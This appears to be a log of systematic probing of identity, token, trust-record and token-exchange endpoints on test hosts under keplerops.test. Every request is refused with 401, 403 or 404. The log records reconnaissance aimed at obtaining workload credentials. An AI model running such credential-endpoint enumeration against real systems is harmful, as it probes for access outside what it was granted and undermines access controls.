+-- workloads/api/workspaces/current/token -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/token -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/identity -> 401 :: {"error":"authentication_required"} 
+-- workloads/api/trust-records/TR-1 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- workloads/api/token-exchange/rowan-workspace -> 401 :: {"error":"authentication_required"} 
+-- workload/api -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workloads -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workloads/current -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workloads/current/token -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workspaces -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workspaces/current -> 401 :: {"error":"authentication_required"} 
+-- workload/api/workspaces/current/token -> 401 :: {"error":"authentication_required"} 
+-- workload/api/token -> 401 :: {"error":"authentication_required"} 
+-- workload/api/identity -> 401 :: {"error":"authentication_required"} 
+-- workload/api/trust-records/TR-1 -> 403 :: {"error":"k3s_rbac_denied"} 
+-- workload/api/token-exchange/rowan-workspace -> 401 :: {"error":"authentication_required"} 
+-- id/api -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workloads -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workloads/current -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workloads/current/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workspaces -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workspaces/current -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/workspaces/current/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/identity -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/trust-records/TR-1 -> 404 :: {"error":"Unable to find matching target resource method"}
+-- id/api/token-exchange/rowan-workspace -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workloads -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workloads/current -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workloads/current/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workspaces -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workspaces/current -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/workspaces/current/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/token -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/identity -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/trust-records/TR-1 -> 404 :: {"error":"Unable to find matching target resource method"}
+-- identity/api/token-exchange/rowan-workspace -> 404 :: {"error":"Unable to find matching target resource method"}
+=== ID ROOT/WELLKNOWN ===
+-- https://id.keplerops.test/
+HTTP/1.1 302 Found
+Server: nginx
+Date: Fri, 20 Nov 2026 18:25:56 GMT
+Content-Length: 0
+Connection: keep-alive
+Location: https://identity.keplerops.test/admin/
+Referrer-Policy: no-referrer
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+
+
+-- https://id.keplerops.test/.well-known/fieldkest-client
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Fri, 20 Nov 2026 18:25:56 GMT
+Content-Type: application/json
+Content-Length: 58
+Connection: keep-alive
+
+{"error":"Unable to find matching target resource method"}
+-- https://id.keplerops.test/.well-known/openid-configuration
+HTTP/1.1 404 Not Found
+Server: nginx
+Date: Fri, 20 Nov 2026 18:25:57 GMT
+Content-Type: application/json
+Content-Length: 58
+Connection: keep-alive
+
+{"error":"Unable to find matching target resource method"}
+DONE_K14_R3
